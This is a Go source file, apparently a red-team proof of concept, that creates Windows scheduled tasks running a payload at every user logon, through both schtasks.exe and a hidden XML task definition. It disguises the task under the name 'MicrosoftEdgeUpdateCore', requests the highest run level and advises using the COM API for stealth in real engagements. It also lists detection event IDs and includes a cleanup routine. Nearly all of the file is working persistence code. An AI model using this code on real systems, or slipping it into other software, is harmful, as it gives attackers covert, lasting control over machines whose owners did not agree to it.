// +build windows

// Scheduled Task Persistence - MITRE ATT&CK T1053.005
//
// Creates a Windows Scheduled Task that runs the payload at user logon.
// Two implementation approaches shown here:
//
//   1. schtasks.exe wrapper  - simple, high-level, but spawns a child process
//                              (visible in Sysmon Event ID 1, 4698).
//   2. XML task definition   - same result, shows the underlying XML schema
//                              that the Task Scheduler COM API consumes.
//
// For stealth in real engagements, prefer the COM API (ITaskService) directly
// rather than shelling out to schtasks.exe.  This PoC uses the wrapper for
// readability.
//
// Detection: Event ID 4698 (task created), Sysmon Event ID 11 in
// C:\Windows\System32\Tasks\, autoruns.

package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

const taskName = "MicrosoftEdgeUpdateCore" // blend-in name

// CreateScheduledTask registers a task that runs payloadPath at logon for
// the current user.  No admin required for HKCU-scoped tasks.
func CreateScheduledTask(payloadPath string) error {
	args := []string{
		"/Create",
		"/F",                         // force overwrite if exists
		"/TN", taskName,
		"/TR", payloadPath,
		"/SC", "ONLOGON",             // trigger: on any user logon
		"/DELAY", "0000:30",          // 30-second delay after logon
		"/RL", "HIGHEST",             // request highest available privileges
	}

	out, err := exec.Command("schtasks.exe", args...).CombinedOutput()
	if err != nil {
		return fmt.Errorf("schtasks create failed: %w\n%s", err, out)
	}
	fmt.Printf("[+] Scheduled task created: %s\n", taskName)
	return nil
}

// CreateScheduledTaskXML does the same thing via an XML definition piped to
// schtasks /XML, giving you full control over task properties without admin.
func CreateScheduledTaskXML(payloadPath string) error {
	// XML element-text escaping.  Backslashes in Windows paths are NOT escaped;
	// only &, <, > need replacement inside the <Command> element.
	escaped := payloadPath
	escaped = strings.ReplaceAll(escaped, "&", "&amp;")
	escaped = strings.ReplaceAll(escaped, "<", "&lt;")
	escaped = strings.ReplaceAll(escaped, ">", "&gt;")

	// Encoding declaration must match the bytes we actually write (UTF-8).
	taskXML := `<?xml version="1.0" encoding="UTF-8"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT30S</Delay>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Hidden>true</Hidden>
  </Settings>
  <Actions>
    <Exec>
      <Command>` + escaped + `</Command>
    </Exec>
  </Actions>
</Task>`

	// Write XML to a temp file; schtasks /XML reads from file.
	tmp, err := os.CreateTemp("", "task*.xml")
	if err != nil {
		return fmt.Errorf("temp file: %w", err)
	}
	defer os.Remove(tmp.Name())

	if _, err := tmp.WriteString(taskXML); err != nil {
		return fmt.Errorf("write xml: %w", err)
	}
	tmp.Close()

	out, err := exec.Command("schtasks.exe",
		"/Create", "/F",
		"/TN", taskName+"_XML",
		"/XML", tmp.Name(),
	).CombinedOutput()
	if err != nil {
		return fmt.Errorf("schtasks /XML failed: %w\n%s", err, out)
	}
	fmt.Printf("[+] XML-defined task created: %s_XML\n", taskName)
	return nil
}

// DeleteScheduledTask removes the persisted task (cleanup helper).
func DeleteScheduledTask() {
	for _, name := range []string{taskName, taskName + "_XML"} {
		out, err := exec.Command("schtasks.exe", "/Delete", "/F", "/TN", name).CombinedOutput()
		if err == nil {
			fmt.Printf("[+] Deleted task: %s\n", name)
		} else {
			fmt.Printf("[-] Could not delete %s: %s\n", name, out)
		}
	}
}

func main() {
	payload := os.Args[0]
	if len(os.Args) > 1 {
		payload = os.Args[1]
	}

	if err := CreateScheduledTask(payload); err != nil {
		fmt.Println("[-] Task creation failed:", err)
		return
	}

	// Also demonstrate the XML variant.
	if err := CreateScheduledTaskXML(payload); err != nil {
		fmt.Println("[-] XML task creation failed:", err)
	}
}
